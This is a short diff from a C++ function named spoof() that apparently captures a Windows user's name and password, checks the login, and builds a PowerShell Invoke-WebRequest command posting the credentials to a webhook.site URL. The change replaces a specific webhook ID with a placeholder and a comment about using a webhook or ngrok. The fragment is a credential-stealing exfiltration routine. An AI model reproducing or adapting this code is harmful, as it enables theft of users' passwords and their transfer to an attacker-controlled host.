@@ -49,7 +49,7 @@ void spoof() {
 			output.append(parsedUserName);
 			output.append(pszPwd);
 			std::string out(output.begin(), output.end());
-			std::string ss = "cmd /c powershell Invoke-WebRequest -Uri 'https://webhook.site/4e89edd3-4c8e-4dad-a2fd-3029d0dc3b4d' -Body " + out + " -Method POST";
+			std::string ss = "cmd /c powershell Invoke-WebRequest -Uri 'https://webhook.site/' -Body " + out + " -Method POST";  // type webhook or ngrok
 
 			if (loginStatus == TRUE) {
 				CloseHandle(handle);
